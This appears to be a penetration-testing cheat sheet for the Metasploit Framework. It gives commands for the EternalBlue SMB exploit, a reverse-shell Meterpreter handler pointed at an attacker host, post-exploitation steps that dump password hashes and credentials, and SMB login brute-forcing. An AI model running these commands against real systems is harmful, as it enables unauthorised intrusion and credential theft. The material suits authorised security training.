# 05.03 Metasploit Framework

> Battle-tested exploit framework — exploits, payloads (msfvenom), post-exploit modules, handlers.

## Overview

Metasploit is older but still hugely useful. msfconsole gives you searchable exploit and post-exploit modules; msfvenom generates payloads (reverse shells, Meterpreter, custom); handlers catch connections. Use for: CVE exploitation (search modules), payload generation (msfvenom), credential stuffing modules, and as a Meterpreter handler.

## Steps

- **Step 1** - Install (preinstalled on Kali).
- **Step 2** - Update + restart Postgres on first run.
- **Step 3** - Find a module with `search`, configure with `set`, fire with `exploit` / `run`.
- **Step 4** - For payloads, msfvenom generates standalone binaries.

## Commands

### Install + DB init

```bash
sudo apt install -y metasploit-framework
sudo msfdb init  # postgres backend
msfconsole -q
```

### Module search and use

```text
msf6 > search type:exploit name:eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > options
msf6 exploit(ms17_010_eternalblue) > set RHOSTS <TARGET>
msf6 exploit(ms17_010_eternalblue) > set LHOST <ATTACKER>
msf6 exploit(ms17_010_eternalblue) > exploit
```

### Multi/handler

```text
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <ATTACKER>
set LPORT 443
set ExitOnSession false
exploit -j -z
```

### Post-exploit Meterpreter

```text
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem
meterpreter > ps
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > portfwd add -l 8080 -r 127.0.0.1 -p 80
```

### Auxiliary scanner modules

```text
use auxiliary/scanner/smb/smb_login
set RHOSTS targets.txt
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
